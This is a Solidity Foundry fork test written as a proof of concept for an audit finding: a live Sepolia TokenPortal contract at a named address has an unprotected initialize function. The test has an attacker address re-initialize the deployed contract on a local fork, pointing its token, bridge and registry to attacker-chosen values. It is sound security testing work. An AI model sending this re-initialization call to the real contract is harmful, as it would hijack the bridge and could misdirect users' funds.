// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.27;

// PoC for harden finding F-001 (CRITICAL): the LIVE Sepolia TokenPortal
// (0x9c41d1dd627ed53e25702590ab974d9dfa0c11ea, git-tracked in
// faucet/public/testnet-bridge.json and wired into the shipping faucet Bridge UI) has an
// unprotected, guardless `initialize`. This fork test calls `initialize` on the REAL deployed
// bytecode from a random attacker EOA and proves it repoints `underlying` / `l2Bridge`.
//
// Read-only local fork (vm.createSelectFork) — no real transaction, no funds move.
// Run: SEPOLIA_RPC_URL=... forge test --match-path test/PortalReinit.t.sol -vv
// (forge auto-loads SEPOLIA_RPC_URL from .env locally; the test skips if it's absent.)

import {Test} from "forge-std/Test.sol";

interface ILivePortal {
    function initialize(address registry, address underlying, bytes32 l2Bridge) external;
    function underlying() external view returns (address);
    function l2Bridge() external view returns (bytes32);
    function registry() external view returns (address);
}

contract FakeRollup {
    function getOutbox() external view returns (address) {
        return address(this);
    }

    function getInbox() external view returns (address) {
        return address(this);
    }

    function getVersion() external pure returns (uint256) {
        return 1;
    }
}

contract FakeRegistry {
    address private _rollup;

    constructor(address rollup_) {
        _rollup = rollup_;
    }

    function getCanonicalRollup() external view returns (address) {
        return _rollup;
    }
}

contract PortalReinitForkTest is Test {
    address constant LIVE_PORTAL = 0x9c41d1DD627ed53E25702590ab974d9DfA0c11Ea;

    function test_F001_attacker_reinitializes_the_LIVE_portal() public {
        string memory rpc = vm.envOr("SEPOLIA_RPC_URL", string(""));
        if (bytes(rpc).length == 0) {
            emit log("SKIP: SEPOLIA_RPC_URL not set");
            return;
        }
        vm.createSelectFork(rpc);

        ILivePortal portal = ILivePortal(LIVE_PORTAL);

        // Current (legitimate) wiring on the live contract.
        address realUnderlying = portal.underlying();
        bytes32 realBridge = portal.l2Bridge();
        emit log_named_address("live underlying (before)", realUnderlying);
        emit log_named_bytes32("live l2Bridge (before)", realBridge);
        require(realUnderlying != address(0), "portal not initialized on fork");

        // Attacker (random EOA, zero privilege) re-initializes the live portal.
        address attacker = address(0xA77ACC);
        address evilToken = address(0xE171110000000000000000000000000000000001);
        bytes32 evilBridge = bytes32(uint256(0x6666));
        FakeRegistry evilRegistry = new FakeRegistry(address(new FakeRollup()));

        vm.prank(attacker);
        portal.initialize(address(evilRegistry), evilToken, evilBridge);

        // VULN PROVEN against the REAL deployed bytecode: a random EOA repointed it.
        assertEq(portal.underlying(), evilToken, "HIJACK: underlying repointed on the LIVE portal");
        assertEq(portal.l2Bridge(), evilBridge, "HIJACK: l2Bridge repointed on the LIVE portal");
        assertEq(portal.registry(), address(evilRegistry), "HIJACK: registry repointed on the LIVE portal");
        emit log("F-001 CONFIRMED: live portal is permissionlessly re-initializable");
    }
}
